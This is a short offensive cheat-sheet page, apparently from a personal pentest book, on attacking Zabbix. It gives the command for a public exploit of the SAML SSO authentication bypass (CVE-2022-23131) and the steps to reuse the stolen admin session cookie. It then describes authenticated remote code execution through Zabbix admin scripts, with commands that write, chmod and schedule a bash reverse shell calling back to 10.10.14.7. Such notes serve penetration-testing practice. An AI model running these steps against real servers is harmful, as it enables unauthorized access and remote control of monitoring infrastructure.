## Enumeration 

<br> 
<br> 

## Attacking Zabbix
#### Zabbix - SAML SSO Authentication Bypass
https://github.com/kh4sh3i/CVE-2022-23131
```bash
python3 zabbix_session_exp.py  -t https:target.com -u Admin
copy admin token & add to cookie-editor & click on SSO link to bypass login
```
![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/9a3044df-11fe-4cbc-89cf-c8ac86a06416)

#### Authenticated RCE 
If we have admin access to the Zabbix dashboard we can execute scripts to obtain a reverse shell - `Administration -> Scripts -> Create New`

![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/e8a06c50-bdc4-457e-a5a5-abef6174aae3)

```bash
id
uname -a
echo '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.7/80 >&1' > /tmp/rce.sh
echo "\n"
cat /tmp/rce.sh
echo "\n"
chmod 777 /tmp/rce.sh
echo "bash -c /tmp/rce.sh" | at now +1 minutes
```
![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/afacbee8-2b16-4c8f-97bd-f7abed498147)

Trigger shell in global dashboard view 
![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/f89553a5-c427-4693-9f56-f83a22b6ad9f)
